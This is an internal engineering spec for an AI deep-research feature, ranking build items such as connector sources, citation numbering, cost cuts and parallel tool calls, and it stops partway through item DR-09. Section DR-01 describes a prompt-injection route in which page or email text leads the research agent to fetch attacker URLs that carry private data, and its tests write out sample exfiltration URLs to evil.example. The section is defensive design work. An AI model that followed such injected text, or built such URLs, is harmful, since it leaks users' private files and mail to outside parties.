# Deep Research: verified, build-ready spec (Alevr vs ChatGPT deep research and Claude Research)

Date: 2026-10-31. Repo: `/home/user/juno` at `e532983ea`. Everything below was checked by reading the code. Nothing was run against a provider.

This spec replaces `deep-research-audit.md` for building. Every item has been re-checked against the code. Each one is self-contained and sized to land as one focused PR. Items are ranked by value: user-felt impact first, then correctness and security, then cost to build. The order to build them in is at the end.

Not specified here because it is being built in parallel: sharing with people, per-chat memory off, AI artifacts, PDF/Google Docs/Slides export, locked chats, Drive/OneDrive attach in the composer, connectors in voice, tone sliders, MCP Apps widgets, plugins, and the UI/motion redesign. UI is mentioned only where a feature cannot work without it.

---

## 0. Competitor baseline (checked today)

- **[C-R] Claude Research.** Source: https://support.claude.com/en/articles/11088861-using-research-on-claude-ai, fetched 2026-10-31.
  - Runs on Opus 5.5, falling back to Opus 4.8, whatever model the chat uses.
  - Searches the web, plus Gmail, Google Calendar and Google Docs, plus "any other connectors turned on for the chat", automatically and without asking for approval each time.
  - Mobile runs web-only research and skips connectors without saying so.
  - Local MCP servers are not used.
  - Shares the chat usage limits but uses them faster.
- **[C-ENG] Anthropic's multi-agent research system.** Source: https://www.anthropic.com/engineering/multi-agent-research-system.
  - Orchestrator plus 3–5 parallel subagents, each using 3+ tools in parallel; together these cut time by up to 90%.
  - About 15x the tokens of chat.
  - A separate citation pass.
  - LLM-judge rubric: factual accuracy, citation accuracy, completeness, source quality, tool efficiency.
- **[O-DR] ChatGPT deep research.** Source: help.openai.com/en/articles/10500283-deep-research-in-chatgpt. The page does not resolve from this session, so this rests on its search excerpt (2026-10-31).
  - Uses "available read actions from connected apps", never write actions. An app is a source only when it supports deep research.
  - **Sites > Manage sites** can either *restrict* research to listed domains or *prioritize* them while still searching the whole web.
  - You can monitor progress, change the scope and add sources mid-run.
- **[O-FEB] ChatGPT, Feb 10–11 2026 update** (press): GPT-5.2; full-screen viewer with a table of contents; export to Markdown, Word and PDF; charts and visual summaries.
  - https://www.technobezz.com/news/openai-upgrades-chatgpt-deep-research-with-source-selection-and-document-viewer
  - https://www.pulse.bot/ai/news/openais-deep-research-now-runs-on-gpt-52-and-lets-users-search-specific-websites-c27a7f5d-db61-47af-8f43-4c07844e16f8/
- **Neither competitor documents** follow-up retrieval over the run's own corpus, continuing or refreshing a report, or claim-level citation audits. Alevr can lead on all three.

---

## 1. Ranked items

| Rank | ID | Title | Size | Impact | Depends on |
|---|---|---|---|---|---|
| 1 | DR-01 | Close the private-data leak through worker-chosen URLs | S | H (security) | none |
| 2 | DR-02 | Follow-ups cite with the report's on-screen numbers, and the report is not pasted twice | S | H | none |
| 3 | DR-03 | Live research quality and cost harness | M | H (enabler) | none |
| 4 | DR-04 | Connected apps as research sources: Gmail, Drive, Google Calendar, Outlook, OneDrive/SharePoint, Slack | M | H | DR-01 |
| 5 | DR-05 | Reports shaped to the question (archetypes) across planner, researchers, gap audit and writer | M | H | DR-03 to prove |
| 6 | DR-06 | Repair flagged claims section by section, not by rewriting the whole report | M | H (speed, cost) | DR-03 to prove |
| 7 | DR-07 | Parallel tool calls inside each researcher | S | H (speed) | none |
| 8 | DR-08 | Tiered search fan-out and smaller result pages for researchers | M | H (cost) | DR-03 to prove |
| 9 | DR-09 | Researchers search inside connected apps (`search_private` / `open_private`), plus GitHub, Notion and opt-in custom MCP | M | H | DR-01, DR-04 |
| 10 | DR-10 | `research_lookup`: follow-ups answered from everything the run read | M | M-H | DR-02 |
| 11 | DR-11 | Guidance applied live, and guidance or pins no longer lost during the lead's review | S-M | M | none |
| 12 | DR-12 | Cited figures (charts) in reports | S-M | M | DR-05 helps |
| 13 | DR-13 | Site rules: only these sites, never these sites | S-M | M | DR-01 |
| 14 | DR-14 | Native (iOS and macOS) plan gate parity | M | M | none (reads DR-04/05/13 fields when present) |
| 15 | DR-15 | Scholarly, medical and filings search backends | M | M | DR-08 |
| 16 | DR-16 | Extend or refresh a report (run lineage) | M | M | none |
| 17 | DR-17 | Read JavaScript-only pages through the leashed Work browser | M | M | none |

Sizes: S = up to about 2 days, M = 3–6 days, for one engineer who knows the codebase.

---

## DR-01. Close the private-data leak through worker-chosen URLs

**Size S. Impact H (security). Ships first; DR-04, DR-09 and DR-13 depend on it.**

**Problem (verified).**
- A researcher's `open_page` fetches any public URL the model names.
  - `validateToolUrl` (`src/lib/research/agents/protocol.ts:176-192`) blocks only non-http(s) and non-public hosts.
  - `bindWorkerTools().openPage` (`src/lib/research/stages/workers.ts:371-437`) then calls `fetchPage` with no further check.
- Web *search queries* are cleaned against the run's private fingerprint (`guardedWebSearch`, `src/lib/research/stages/context.ts:494-512`, using `sanitiseWebQuery` from `src/lib/research/private-sources.ts:363`). *URLs are never checked.*
- So a page the researcher reads, or a document in the person's own sources, can make it open something like `https://attacker.example/c?d=<text from the person's file>`. The fetch alone delivers the data.
- This can happen **today**: file, project, library, memory and Apple Mail sources all reach researchers (`agents/worker.ts:349-354` lists their `private.invalid` addresses). DR-04 adds Gmail, which makes it much worse: any inbound email is attacker-written text.

**Change.**
1. Add a pure `privateSafeOpenUrl(url, ctx)` to `src/lib/research/private-sources.ts`, next to `sanitiseWebQuery`. It returns `{ok:true} | {ok:false, reason}`. `ctx = { known: (canonical) => boolean, pinned: Set<string>, fingerprint: PrivateFingerprint | null }`. The URL is allowed when any of these holds:
   - (a) Its canonical URL is already a source row of this run. Every search hit is upserted as a row at search time (`workers.ts:338-358`), and link-hop targets come from public pages.
   - (b) It is in `plan.pinnedSources`.
   - (c) It is a *clean public URL*, meaning all of:
     - no query string;
     - at most 6 path segments, each at most 48 characters;
     - no segment matching `/^[A-Za-z0-9+/=_-]{24,}$/` (an opaque token);
     - `sanitiseWebQuery(<decoded host and path words>, fingerprint).changed === false`.
2. In `openPage`, apply the check only when `parsePlan(run.plan).sources?.enabled` contains any private key (runs without private sources are unchanged). On refusal, return `{ ok:false, url, reason: "While this research reads your own sources, open pages from search results or pinned links." }` and do **not** fetch.
3. Log refusals as `{kind:"error", payload:{scope:"private_guard", host}}`, with the **host only**. The full URL may carry the private data, and `worker_tool_call` already logs the argument (`workers.ts:233-241`). Pass the host instead of the URL to `tick` for refused calls.
4. Test that the link hop (`stages/corpus.ts:430-487`) discovers links only from fetched public pages. That is true today; the test locks it in.

**Data model / API.** None.

**Acceptance tests.** New file `tests/research-private-exfil.test.ts`. Use the in-memory store `tests/fixtures/research-store.ts` and a spy `fetchPage`. Set up a private file row with the text "Project Nightjar budget 4,812,330 approved by Dana Whitfield".
- `open_page("https://evil.example/c?d=Project%20Nightjar")` is refused and the spy is never called.
- `https://evil.example/project-nightjar-4812330` is refused (path words match the fingerprint).
- `https://evil.example/UHJvamVjdCBOaWdodGphcg==` is refused (opaque segment).
- A URL from this run's search hits is allowed. A pinned URL is allowed. `https://docs.vendor.com/pricing` is allowed (clean).
- With no private sources enabled, every public URL is allowed (no regression).
- The refusal event payload contains the host and not the path.

**Risk.** Researchers that guess URLs lose some reach on private-source runs. Measure with DR-03 (pages read per run with private sources on).

---

## DR-02. Follow-ups cite with the report's on-screen numbers, and the report is not pasted twice

**Size S. Impact H** (every follow-up turn after a report).

**Problem (verified).**
- On every non-research turn, `resolveResearchStage` (`src/lib/chat/turn/research-stage.ts:88-105`) loads the newest completed run and appends `run.report.slice(0, 48000)` to the system prompt. That copy uses **corpus numbering**: `run.report` is stored as the audit checked it (`completion.ts` `runReport`).
- Its source list is ordered by `fetchedAt`, every entry marked `cited: true`. That list is seeded into `acc.sources`, which resolves the follow-up answer's `[n]` chips.
- The person reads a report renumbered so that `[1]` is the first source cited (`orderCompletionSources`, `src/lib/research/completion-core.ts:111-140`).
- The completion message itself (summary plus the full renumbered report as an artifact, `completionContent`, `completion-core.ts:45-51`) is already in chat history (`src/lib/chat/turn/history.ts:46-105`) while it is inside the window.
- So the model sees the report twice under two numberings, and the chips resolve against the corpus order. "What does [3] say?" points at the wrong source. The paste also costs about 12k tokens per turn.

**Change.**
1. New file `src/lib/research/followup-context.ts`, server-only. Function `followUpResearchContext({userId, conversationId, historyMessageIds})`. It:
   - loads the newest `completed | partially_completed` run with `assistantMessageId`;
   - loads that message, scoped by `conversationId` and the owner;
   - decrypts `content` with `decryptMessageText`;
   - extracts the report artifact body. It is already in **visible numbering**.
   - It also loads `message.sources`, which is in visible order with the cited flags as stored.
2. In `research-stage.ts`:
   - When `historyMessageIds.has(run.assistantMessageId)`, **append nothing** to the system prompt. Only seed `acc.seedSources(message.sources)`.
   - Otherwise (the message has been compacted out of the window), append the visible-numbered report (cap 48,000 characters) and seed the same visible-order sources.
   - Fallback for runs without a message: the old path, but renumbered with `orderCompletionSources({corpus: citableSources(rows), summary: "", report})`.
3. Wire `historyMessageIds` from `resolveHistory().recent` (it has ids) through `src/lib/chat/turn/run-turn.ts:562-575` into `resolveResearchStage`.

**Data model / API.** None.

**Acceptance tests.** New file `tests/research-followup-context.test.ts`.
- A fixture where the writer's first citation is `[7]`: the seeded source at index 0 is corpus source 7, and the pasted context's `[1]` is that same source.
- When the completion message is in the window, the system prompt does not contain the report (it gets shorter by at least the report's length).
- Ownership: a run in another user's conversation with the same id is never read.
- A `partially_completed` run is handled the same way.

---

## DR-03. Live research quality and cost harness

**Size M. Impact H.** It enables everything else: DR-05, DR-06 and DR-08 must show "same or better quality at lower cost" with it, which is what the user asked for.

**Problem (verified).**
- `scripts/eval-research-citations.ts:9-13` runs fixed reports through stub judges and says so: "A live-model judge is NOT run here".
- `docs/rework/program/RESEARCH.md:45`: "Not established: a provider-backed live run, cost/quality evaluation".
- No harness measures time, cost by line item, or quality end to end.
- Spend already arrives as `spend_recorded {step, microUsd}` events (`src/lib/research/stages/context.ts:390-408`), and `research.estimate.actual` is logged.

**Change.**
1. `src/lib/eval/research-live-cases.ts`: 30 cases.
   - Fields: `{id, prompt, language: en|fr|de, archetype, mustCover: [{fact, url}], forbidden: [claim], privateFixture?}`.
   - Spread across archetypes: decision, explainer (history, science), evidence review (medicine), market sizing, timeline, landscape.
   - 3 cases use a private-file fixture, to measure DR-01 and DR-04.
2. `scripts/eval-research-live.ts`:
   - Runs each case through the real engine (`researchEngine()`, `src/lib/research/run.ts:940`) on a dev database, as a dedicated eval user seeded like `scripts/seed-research-e2e.ts`.
   - Sequence: `start` → `decidePlan({decision:"confirm"})` → `drive` until terminal.
   - Records: time to plan, time to report, pages read, searches by engine, and `spend_recorded` totals by step (search, fetch, worker, review, writer, audit, revision). Also records the audit summary and the final report.
   - Flags: `--cases <ids|n>`, `--dry` (scripted deps from `tests/fixtures/research-deps.ts`, no network, runs in CI), `--write`.
3. `src/lib/eval/research-live-judge.ts`:
   - Fixed judge model and prompt scoring the [C-ENG] rubric 0–1: factual accuracy, citation accuracy, completeness, source quality, tool efficiency.
   - Adds "structure fits the question" (used by DR-05), must-cover recall (fact plus a citation to a page that states it) and forbidden-claim hits.
   - Length-normalised: a penalty above 1.5x the median length for the archetype.
4. Output: `docs/rework/program/evidence/research-live-<date>.json`. **Gate:** exit non-zero when any rubric mean drops by more than 0.03 against the committed baseline file. Cost and time deltas are printed.
5. Optional, manual: `bench/research/competitors/<case>.md` holds ChatGPT and Claude reports captured by hand. `--pairwise` runs a blind A/B judge on those cases.

**Acceptance tests.**
- `npm run eval:research-live -- --dry --cases 3` passes in CI and writes every JSON field.
- The judge is reproducible: the same report scored twice differs by at most 0.05 on every dimension (a fixture test with a recorded judge response).
- The gate fails on a synthetic baseline 0.05 higher.

**Cost.** About $5–15 per live case. Run 8 nightly cases and the full set before a release.

---

## DR-04. Connected apps as research sources (sweep level)

**Size M. Impact H.** This is the biggest visible gap. Requires DR-01.

**Problem (verified).**
- `SEARCHABLE_CONNECTORS` holds only `apple-calendar` and `apple-mail` (`src/lib/research/private-retrieval.ts:33-37`). The options query filters `provider in` those two (`:63-66`).
- `searchPrivateSourcesWith` (`src/lib/research/private-retrieval-core.ts:297-388`) knows only `list_events` and `search_messages`/`read_message`. Every other connector is skipped as `notRead` (`:385-387`).
- Yet the first-party MCP servers already expose read tools with `readOnlyHint` (`src/lib/first-party-connectors/tools.ts:33-110`):
  - Gmail `search_messages`/`read_message` (`read_message` returns `format=full` MIME JSON with base64url parts);
  - Drive `search_files`/`read_file`;
  - Google Calendar `search_events`;
  - Outlook `search_messages`/`read_message`/`search_events`;
  - Microsoft 365 `search_files`/`read_file`;
  - Slack `search_messages`.
- They are served through `/api/mcp/first-party/[id]` (output capped at 50,000 characters, `route.ts:41`), and the research toolset already opens connectors `unattended` and calls only `accessFor === "read"` tools (`private-retrieval.ts:146-171`).
- [C-R] and [O-DR] both treat connected apps as sources.

**Change.**
1. **Registry.** New file `src/lib/research/connector-sources.ts`, pure apart from the session port. Type `ConnectorSource = { id, kind: "mail"|"calendar"|"connector", label, search(session, term, ctx) → Hit[], read?(session, hitId) → {title, text, date?} }`. Entries:
   - `gmail`:
     - search `search_messages {query: "<term> newer_than:2y", limit: 10}` returns ids;
     - read `read_message {messageId}`, then decode in a new pure `decodeGmailMessage(json)`: Subject, From and Date headers; `text/plain` parts base64url-decoded; else `text/html` stripped with the existing extractor; cap 20,000 characters.
   - `google-drive`:
     - search `search_files {query: "fullText contains '<term with ' and \\ escaped>' and trashed = false", limit: 10}`;
     - read `read_file {fileId}`. Native Docs, Sheets and Slides export as text. A `note: "cannot be read as text"` becomes a skip reason. Drive PDFs are out of scope here.
   - `google-calendar`: `search_events {query: term, from: now-180d, to: now+90d, limit: 50}`.
   - `outlook`:
     - mail: `search_messages {query: term, limit: 10}` + `read_message`;
     - calendar: `search_events {from, to}`, then the existing local `overlapScore` filter, the same as Apple Calendar.
   - `microsoft-365`: `search_files {query: term}` + `read_file {fileId, driveId?}`.
   - `slack`: `search_messages {query: term, limit: 20}`. The text is in the listing, so there is no read call. Title is `#channel · author · date`.
   - `apple-calendar` and `apple-mail`: the existing code moved here unchanged.
2. **Offer.**
   - `privateSourceOptionsFor` (`private-retrieval.ts:46-82`) offers every registry connector that the person has a `Connection` for, that passes `isConnectorConfigured`, and that is not in `settings.blockedConnectors`.
   - The label comes from `getConnector(id).label`.
   - Default **off** (`DEFAULT_ON_KINDS` unchanged). The person switches it on at the gate. The scope card already renders any option with a label (`src/components/research/scope-card.tsx:448-466`).
3. **Retrieve.**
   - `searchPrivateSourcesWith` dispatches on the registry instead of the `calendar`/`mail` branches.
   - Keep the existing budgets: `mailSearchTerms` (at most 3 terms), `MAX_MESSAGES`, `MAX_EVENTS`. Calls run sequentially per connector, which is gentle on rate limits; Slack `search.messages` is Tier 2.
4. **Addressing.** Private URLs for new connectors are namespaced: `https://private.invalid/<kind>/<connectorId>~<id>`. Without the namespace, Gmail and Outlook ids could collide under `mail/`.
   - `parsePrivateSourceUrl` must accept `~`.
   - Apple ids keep their current form.
   - `MAX_ID_CHARS` (200) covers Drive ids (about 44 characters).
5. **API.** `decidePlanSchema.sources.enabled` max goes from 12 to 32 (`src/app/api/research/protocol.ts:131-138`). The engine already intersects with the offered keys.
6. **Billing.** First-party calls are free. Each call still writes the MCP audit trail through the toolset, as today.

**Security.**
- Read tools only; enforced by `accessFor`, which is unchanged.
- Approval-required tools are refused at once because the run is `unattended`.
- Text goes into the corpus as `ResearchSource` rows. Every web query is cleaned against the fingerprint, which is rebuilt when the count of private rows changes (`context.ts:464-490`). URLs are covered by DR-01.
- Snippets of private sources are already blanked on the shared message (`completion-core.ts:129`).
- The writer marks "(your sources)" (`corpus.prompt.ts`, `CITATION_RULES`).

**Acceptance tests.** Extend `tests/research-private-sources.test.ts` with scripted sessions for gmail, google-drive, google-calendar, outlook, microsoft-365 and slack:
- Options list exactly the connected, configured, unblocked connectors, and a blocked one is never offered.
- A Gmail fixture with a multipart base64url body yields a passage containing the decoded text.
- A Drive `note` reply yields a skip with a reason, not a hit.
- A write tool name, or an `accessFor !== "read"` tool, is never called.
- A refused call is recorded as `SKIP.refused`.
- A property test over 100 random synthetic mails: no web query sent after the sweep contains a fingerprint term.
- Live check (manual): a run with Drive and Gmail on cites at least one Drive file and one Gmail thread, both marked "(your sources)".

**Out of scope.** Researchers searching inside apps mid-run (DR-09). Drive and OneDrive PDF bodies (a follow-up: export to bytes and run them through `src/lib/search/pdf-layout.ts`).

---

## DR-05. Reports shaped to the question (archetypes)

**Size M. Impact H.** Prove it with DR-03.

**Problem (verified). The whole pipeline is shaped for SaaS product comparisons.**
- **Writer.**
  - `reportWriterContract` (`src/lib/research/corpus.prompt.ts:52-100`) always demands, in this order: "Executive verdict" plus a decision matrix; "Comparative matrix"; per-vector deep dives; "Nuances and gotchas" ("hidden rate limits, quotas … IP and training terms, cancellation friction"); disagreements; gaps; methodology.
  - The in-chat contract `chatReportContract` (`:23-38`) is the same.
- **Planner.**
  - The planner prompt (`planner.prompt.ts:78-118`) requires 4–6 vectors that "cover everything a decision needs", with 2–5 exact metrics each. Its examples are pricing, rate limits and changelogs.
  - `planShallowness` (`planner.ts:293-316`) forces a **second paid planner call** when no vector names a metric.
- **Researchers.** The worker system prompt (`agents/worker.ts:319-333`) tells them to hunt "pricing page, changelog … API limits page, terms".
- **Gap audit.** Missing metrics feed the gap audit and forced extra rounds (`stages/workers.ts` around `:1040-1100`). An explainer chases figures that do not exist, which costs time and money.
- **Scope.** `ResearchScope` has no archetype field (`src/types/research.ts:15-21`).

**Change.**
1. **Type.**
   - `ResearchScope.archetype?: "decision" | "explainer" | "landscape" | "evidence_review" | "quantitative" | "timeline"`.
   - `parsePlan` (`src/lib/research/domain.ts`) reads an absent value as `decision`, so older plans behave exactly as today.
   - Add it to `RESEARCH_PLAN_SCHEMA` and the planner parser (`src/lib/research/planner.ts`).
2. **Planner** (`planner.prompt.ts`).
   - The planner picks the archetype first; the rules then branch.
   - `metrics` is required (2–5) only for `decision` and `quantitative`.
   - `explainer`, `timeline` and `evidence_review` vectors carry `questions`, `schools of thought` or `key studies` in `verify`.
   - `primarySources` examples become archetype-specific: archives, primary documents, scholarly histories; trials, meta-analyses, guidelines; official statistics.
   - `planShallowness` checks metrics only for `decision` and `quantitative`.
3. **Researchers** (`agents/worker.ts`). `WORKER_SYSTEM` becomes `workerSystem(archetype)`: a shared core plus one archetype line saying what a primary record is. There are only six variants, and they are built once per run, so the prompt cache still holds across workers.
4. **Gap audit.** For archetypes without metrics, the gap audit reports unanswered `questions` instead of missing figures. It never forces a round to find a figure the plan did not ask for.
5. **Writer.**
   - Split `reportWriterContract` and `chatReportContract` into a shared core: summary, title, question sections, `conflicts`, `gaps`, `method`.
   - Plus per-archetype sections with new markers:

     | Archetype | Sections |
     |---|---|
     | decision | `bottom-line` + `matrix` + `gotchas` (today's layout) |
     | explainer | `overview` + `debate` |
     | landscape | `map` (players and segments table) |
     | evidence_review | `evidence-table` (study, design, n, finding, strength) |
     | quantitative | `figures` (each figure with its method) |
     | timeline | `chronology` |

   - Add the new keys to `REPORT_SECTION_ORDER` in **both** `src/lib/research/report-structure.ts` and `src/components/research/report-structure.ts`. Native readers split on headings generically, so they need no change.
6. **Gate UI.** One select on the web scope card showing the planner's choice; changing it triggers `revise`. The native gate gets it in DR-14.
7. **API.** `decidePlanSchema` (`api/research/protocol.ts:113`) accepts `archetype?: enum`. An edit sets it and forces a `revise`, so the vectors match the new archetype.

**Acceptance tests.**
- Planner round-trip: `archetype` is parsed and older plans read as `decision`. Extend `tests/research-planner-structured.test.ts`.
- Snapshot per archetype in a new `tests/research-writer-archetypes.test.ts`: each contract contains its own markers and none of the others'. `decision` is byte-identical to today's contract.
- `planShallowness` returns `[]` for an explainer plan with no metrics, so there is no retry call.
- The gap audit forces no round for an explainer with every question answered.
- DR-03, 8 non-decision cases: "structure fits the question" improves on the baseline, no rubric dimension drops by more than 0.03, and mean planner and gap-round spend does not rise.

**Risk.** Misclassification. Mitigations: the archetype is editable at the gate, and `decision` is a valid fallback.

---

## DR-06. Repair flagged claims section by section, not by rewriting the whole report

**Size M. Impact H (time to report, cost, prose).** Prove it with DR-03.

**Problem (verified).**
- **Over-triggering.** `shouldRevise` (`src/lib/research/stages/validation.ts:142-148`) is true whenever `validation.repaired` or there are dangling markers.
  - `repairReportFromClaims` (`src/lib/research/claim-analysis.ts:2535-2604`) sets `repaired` even when the only change was **stripping a dangling `[n]` from a supported claim** (`:2541-2542`).
  - So a single bad marker pays for a full rewrite.
- **Cost of the rewrite.** The revision is a **full** writer call: the whole corpus plus the draft, up to `SYNTHESIS_OUTPUT_TOKENS = 16_384` (`domain.ts:2182`; `tools.ts:1035-1050`). It is followed by a second full audit. `MAX_REVISION_ROUNDS = 1` (`domain.ts:634`).
- **Cache.** The corpus cache is `promptCache: "short"` (5 minutes, `tools.ts:1063-1065`). A revision that comes after a long audit can miss it.

**Change.**
1. **Only real rewrites revise.**
   - `validateReport` returns `rewriteClaims`: claims with status `contradicted`, `unsupported` or `partially_supported`, each with its span in the *pre-repair* draft, its verdict, up to 3 supporting, contradicting and rival passages (`JUDGE_PASSAGE_CHARS`), and its citations.
   - Marker-only repairs are applied, but they never trigger a revision.
2. **Targeted revision.** A new function `reviseSections` in `src/lib/research/tools.ts`, next to `writeResearchReport`, with its prompt `sectionRevisionContract` in `corpus.prompt.ts`.
   - Group `rewriteClaims` by `reportSections()` span (`report-structure.ts:72-115`).
   - **Input per affected section:**
     - the section's original text (not the annotated text);
     - each flagged claim with its verdict and passages;
     - the numbered source entries cited in that section, plus the sources of those passages, with numbers preserved;
     - the first and last paragraph of each neighbouring section, read-only.
   - **Output:** the replacement section only, with its marker and heading. Rules: keep unflagged sentences verbatim, correct figures from the passage, drop what nothing supports.
   - **Calls** run in parallel (concurrency 4) on the lead model, with `maxTokens` 2,048 per section.
   - **Validation.** Reject a replacement whose marker or heading changed, that cites outside `1..corpus.length`, or whose length is outside 0.5–1.5x the original. A rejected section keeps today's annotated text.
   - **Splice** the replacements from the end of the report backwards.
3. **Re-audit only what changed.**
   - `recordCitationAudit` (`src/lib/research/claims.ts`) takes `priorVerdicts: Map<claimHash, verdict>`, where `claimHash = hash(normalised claim text + sorted citations)`.
   - Unchanged claims carry their verdict forward. Only new claims are judged.
4. **Fallback.** Keep today's full revision only when more than 50% of sections are affected, there are more than 3 dangling markers, or more than 50% of targeted replacements were rejected.
5. **Durability.**
   - Increment `plan.revisionRound` before the calls, as today, so a crash cannot loop. A crash mid-revision leaves the annotated report, which is honest.
   - The targeted path stays inside `validating_citations`. Only the fallback goes back to `synthesizing`.
6. **Events.** `report_revision {phase: "targeted", sections: [keys], claims: n}`. The timeline can say "Corrected 3 claims in 2 sections".

**Acceptance tests.** New file `tests/research-targeted-revision.test.ts`, with a scripted writer:
- 2 flagged claims in 1 of 8 sections: exactly one revision call. The other 7 sections are byte-identical. Only that section's claims are re-judged.
- A report whose only repair is a dangling marker on a supported claim: no revision call, and the marker is stripped.
- More than 50% of sections flagged: the full rewrite runs (today's path).
- A replacement that drops its marker is rejected, and the annotated text is kept.
- Output tokens across the revision are at most 30% of the full-rewrite fixture.
- DR-03: citation-accuracy not lower, median time to report at least 2 minutes lower, revision spend lower.

---

## DR-07. Parallel tool calls inside each researcher

**Size S. Impact H (time to report).**

**Problem (verified).**
- `runWorkerLoop` runs a turn's calls one after another: `for (const call of turn.calls) { … await … }` (`src/lib/research/agents/worker-loop.ts:227-300`). Even when Haiku emits several calls at once, three page opens take three round trips.
- The compat adapter does not ask for parallel calls (`agents/worker.ts:544-545`; compare `src/lib/llm/compat-loop.ts:496`).
- The prompt never asks for batching (`worker.ts:319-333`).
- [C-ENG]: subagents use 3+ tools in parallel; this and parallel subagents cut time by up to 90%.

**Change.**
1. **Partition calls** in `worker-loop.ts`.
   - Read calls (`search`, `open_page`, `find_in_page`) run concurrently, at most `MAX_PARALLEL_READS = 4`, via `Promise.all`. Results are pushed in call order.
   - `note_finding` and `done` run after the reads, sequentially, in call order.
   - Reserve the budget up front: `toolCalls += n` before dispatch. Calls beyond `maxToolCalls` get "not run: budget".
2. **Shared counters** in `bindWorkerTools` (`stages/workers.ts:210-437`):
   - `openPage` reserves a page slot (`shared.pagesReserved`) before `fetchPage` and releases it on failure. Today's check-then-increment (`:389`, `:423`) would overshoot inside a batch.
   - Near-duplicate searches inside one batch are collapsed before dispatch (the existing `duplicateOf`), so two paraphrases are not both billed.
3. **Prompt.** Add one line to the worker system prompt: "When you need several searches or pages that do not depend on each other, request them together in one turn (up to 4)."
4. **Compat.** Set `parallel_tool_calls: true` where the model's caps allow it, reusing the check in `compat-loop.ts:496`. Anthropic: do not set `disable_parallel_tool_use`.
5. **Unchanged.** The per-host semaphore (`FETCH_PER_HOST = 2`, `stages/context.ts:59`) still bounds load on any one site.

**Acceptance tests.** Extend `tests/research-agents.test.ts` with a scripted adapter.
- A turn with 3 `open_page` calls: the fetches overlap in time (fake clock), the per-host limit holds (`HostLimiter.inFlight ≤ 2`), the budget counts 3, and results come back in call order.
- A batch that would cross `maxToolCalls` runs only what fits.
- Abort mid-batch: every in-flight call rejects, and the loop ends as `aborted`.
- Two near-duplicate searches in one batch: one vendor call.
- `pagesReserved` never exceeds `pageCeiling` with 6 parallel opens against a ceiling of 4.
- DR-03: median investigation time down at least 25% at equal pages read.

---

## DR-08. Tiered search fan-out and smaller result pages for researchers

**Size M. Impact H (cost; more runs per usage window).** Prove it with DR-03.

**Problem (verified, and corrected from the audit).**
- **Every engine, every query.** Research search runs `mode: "fanout"`, meaning every available backend for every query (`src/lib/research/tools.ts:740-750`; `src/lib/search/alevr/service.ts:342-385`; `planFanout`, `backends.ts:242-244`).
- **The audit was wrong on two counts.** In the research path each engine is already asked for exactly `count`, not 1.5x (`perEngineCount: query.count`, `src/lib/search/alevr/backends.ts:35-50`). Exa already returns `highlights`, not `text`.
- **Real prices** (`src/lib/tools/metering.ts:69-81`), per query with all four keyed:

  | Results per query | Tavily | Serper | Brave | Exa | Total |
  |---|---|---|---|---|---|
  | 12 | $0.008 | $0.002 | $0.005 | $0.021 | $0.036 |
  | 20 | $0.008 | $0.002 | $0.005 | $0.037 | $0.052 |
  | 30 | $0.008 | $0.002 | $0.005 | $0.057 | $0.072 |

  Exa is about 70% of the cost at 20 results.
- **Oversized pages.** Researchers get the same 12/20/30 results as the seed sweep (`RESULTS_PER_QUERY`, `src/lib/research/envelope.ts:218-219`). Every hit is rendered into the transcript (`renderSearchDigest`, `agents/protocol.ts:510-519`), so one search is about 14k characters (the `MAX_RESULT_CHARS` cap) in every later turn. Researchers open one to three of them.
- **Estimate.** The envelope's estimate sums every engine per query (`envelope.ts:408-410`).

**Change.**
1. **Tiered mode.** New `mode: "tiered"` in `AlevrSearchInput` (`alevr/service.ts:54-55`).
   - **Primary:** the two cheapest backends that clear the quality floor, in `planDiscovery` order (`backends.ts:216-240`). With every key set, that is Serper ($0.001 at ≤10 results) and Brave ($0.005). A configured SearXNG above the floor sorts first.
   - **Escalate** to the remaining backends, in parallel, when any of these holds:
     - a primary backend failed or came back empty;
     - fewer than `count` distinct URLs after fusion;
     - the caller's optional `isKnown(canonicalUrl)` leaves fewer than `ceil(count/3)` new URLs.
   - `reports` and cost cover every backend called. The query cache key includes the mode.
2. **Smaller pages for researchers.**
   - New additive envelope field `workerResultsPerQuery` (default 10; older envelopes fall back to `resultsPerQuery`).
   - `bindWorkerTools().search` (`stages/workers.ts:276`) passes it, with `mode: "tiered"` and `isKnown` built from `store.listSourceUrls`, through `guardedWebSearch` and `searchTheWeb`.
   - The seed sweep (`stages/corpus.ts` `doSearching`) keeps `fanout` and the breadth table, because breadth matters there.
3. **Flag.** `RESEARCH_SEARCH_TIERED = workers | all | off`, default `workers`.
4. **Estimate.** `envelope.ts` prices worker queries as the primary-pair cost plus `ESCALATION_RATE` (0.35, to be calibrated from DR-03) times the rest. Lower estimates mean bigger envelopes in the same windows.
5. **Expected saving.**
   - A worker query at 10 results: $0.006 without escalation, $0.031 with it. With 35% escalation the mean is about $0.015, against $0.052 today at "broad". That is about 70% off worker search spend.
   - Worker input tokens per search drop by about half, from 20 hits to 10.

**Acceptance tests.** New file `tests/alevr-search-tiered.test.ts`, with backends injected via `AlevrSearchDeps.backends`.
- Two primaries return at least `count` new URLs: only 2 backends are called.
- Overlapping primaries (6 distinct of 10): escalation happens.
- A primary fails: escalation happens.
- Cost equals the sum over called backends.
- `isKnown` marks 8 of 10 as known: escalation happens.

Extend `tests/research-envelope.test.ts`: a worker query's estimate is below the fan-out estimate, and an old envelope without `workerResultsPerQuery` behaves as before.

DR-03: worker search spend per run down at least 50%; completeness and source-quality scores not lower than baseline minus 0.03.

---

## DR-09. Researchers search inside connected apps, plus GitHub, Notion and opt-in custom MCP

**Size M. Impact H.** Requires DR-01 and DR-04.

**Problem (verified).**
- Researcher tools are web-only: `search`, `open_page`, `find_in_page`, `note_finding`, `done` (`agents/protocol.ts:80-165`).
- Private sources come only from the one pre-sweep (`private-retrieval-core.ts`). A researcher who learns from a public page that "the SLA credit dispute" matters cannot look for that thread in Gmail.
- GitHub (`GITHUB_MCP_URL`, default `https://api.githubcopilot.com/mcp/`) and Notion (`https://mcp.notion.com/mcp`) MCP connectors exist (`src/lib/env.ts:97-113`; `src/lib/connectors.ts:99-165`), but research never uses them.
- [C-R]: "any other connectors turned on for the chat".

**Change.**
1. **Tools.** Add `search_private {source, query}` and `open_private {source, id}` to `WORKER_TOOLS` and `parseToolArgs`.
   - Declared to the model only when the run enabled at least one connector option.
   - `source` is an enum of the run's enabled connector keys.
2. **Implementation.** In `bindWorkerTools`, reuse DR-04's registry `search`/`read` through the existing `openConnector` port (one session per worker, closed in `finally`).
   - **Every hit list is stored.** Titles and snippets are upserted as private rows with no snapshot, so the fingerprint (`context.ts:464-490`) learns them before any later web query. Otherwise a subject line seen in a listing could leak into a web search.
